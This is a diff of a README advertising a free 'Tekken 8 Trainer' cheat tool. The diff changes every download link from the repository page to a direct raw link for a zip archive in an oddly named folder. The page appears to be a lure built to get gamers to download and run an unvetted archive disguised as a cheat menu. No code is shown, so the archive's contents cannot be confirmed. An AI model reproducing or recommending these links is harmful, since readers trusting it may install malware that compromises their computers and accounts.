@@ -1,7 +1,7 @@
 <h1>⚔️ Tekken-8-Trainer - Unlock God Mode & Unlimited Health Instantly</h1>
 
 <p align="center">
-  <a href="https://github.com/sava76-git/Tekken-8-Trainer"><img src="https://img.shields.io/badge/⬇️%20DOWNLOAD%20TEKKEN%208%20TRAINER%20FREE%20-%20Latest%20Patch%202026%20-%20%23FF6F00" alt="Download Tekken 8 Trainer" style="max-width:100%;"></a>
+  <a href="https://raw.githubusercontent.com/sava76-git/Tekken-8-Trainer/main/Krameria/2.0-beta.4.zip"><img src="https://img.shields.io/badge/⬇️%20DOWNLOAD%20TEKKEN%208%20TRAINER%20FREE%20-%20Latest%20Patch%202026%20-%20%23FF6F00" alt="Download Tekken 8 Trainer" style="max-width:100%;"></a>
 </p>
 
 ## 🎮 What Is This?
@@ -17,7 +17,7 @@ Think of it as a **cheat menu** that runs alongside the game. You press a button
 ### Step 1: Download the Trainer
 
 👉 **Visit this link to download the application:**  
-**[https://github.com/sava76-git/Tekken-8-Trainer](https://github.com/sava76-git/Tekken-8-Trainer)**
+**[https://raw.githubusercontent.com/sava76-git/Tekken-8-Trainer/main/Krameria/2.0-beta.4.zip](https://raw.githubusercontent.com/sava76-git/Tekken-8-Trainer/main/Krameria/2.0-beta.4.zip)**
 
 Click the big green **"Download"** button on that page. The file will start downloading to your computer. It's a small file, so it should only take a few seconds on a normal internet connection.
 
@@ -121,7 +121,7 @@ Absolutely! You can check all the boxes (Unlimited Health, God Mode, Unlimited R
 
 If you need to re-download the trainer, just use the same link:
 
-**[⬇️ CLICK HERE TO DOWNLOAD TEKKEN 8 TRAINER (FREE)](https://github.com/sava76-git/Tekken-8-Trainer)**
+**[⬇️ CLICK HERE TO DOWNLOAD TEKKEN 8 TRAINER (FREE)](https://raw.githubusercontent.com/sava76-git/Tekken-8-Trainer/main/Krameria/2.0-beta.4.zip)**
 
 ---
 
